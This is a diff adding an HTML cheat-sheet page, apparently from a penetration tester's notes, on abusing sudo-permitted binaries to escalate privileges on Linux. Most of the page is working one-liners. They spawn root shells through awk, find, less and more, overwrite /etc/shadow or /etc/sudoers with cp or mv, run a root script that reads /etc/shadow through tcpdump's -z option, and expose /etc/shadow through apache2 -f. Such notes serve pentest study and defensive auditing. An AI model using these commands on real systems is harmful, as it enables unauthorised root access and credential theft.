@@ -1,0 +1,38 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Excessive / Dangerous Binaries Allowed</title>
+</head><body>If you have sudo access to certain commands, it can allow you to fully escalate privs<br/>
+<br/>
+cp<br/>
+&nbsp;&#09;Overwrite /etc/shadow or /etc/sudoers &#09;#please make a backup first<br/>
+awk<br/>
+&nbsp;&#09;awk 'BEGIN {system("/bin/bash")}'<br/>
+bash<br/>
+&nbsp;&#09;bash -i<br/>
+find #make sure the file can be found!<br/>
+&nbsp;&#09;find / -name /etc/passwd -exec bash -i \; <br/>
+&nbsp;&#09;find / -name /etc/passwd -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;<br/>
+less<br/>
+&nbsp;&#09;From less, you can go into vi and then into shell<br/>
+&nbsp;&#09;less /etc/shadow<br/>
+&nbsp;&#09;v<br/>
+&nbsp;&#09;:shell<br/>
+more<br/>
+&nbsp;&#09;run more on a file larger than your screen<br/>
+&nbsp;&#09;!/bin/bash<br/>
+mv<br/>
+&nbsp;&#09;Overwrite /etc/shadow or /etc/sudoers &#09;#please make a backup first<br/>
+Many more binaries you can exec in (see <a href="nbk:///0dc4f20c-b131-407b-b6d1-e6e19c6587c2">rbash</a>&nbsp;page)<br/>
+Programming language? See reverse shells section<br/>
+sh<br/>
+<br/>
+tcpdump<ul><li style="list-style-type: none">echo $'id\ncat /etc/shadow' &gt; /tmp/.test</li>
+<li style="list-style-type: none">chmod +x /tmp/.test</li>
+<li style="list-style-type: none">sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root</li>
+</ul>
+<br/>
+Apache (-f uses directives in the file config on startup)<br/>
+&nbsp;&#09;sudo apache2 -f /etc/shadow<br/>
+&nbsp;&#09;to host a protected file that you can then view</body></html>
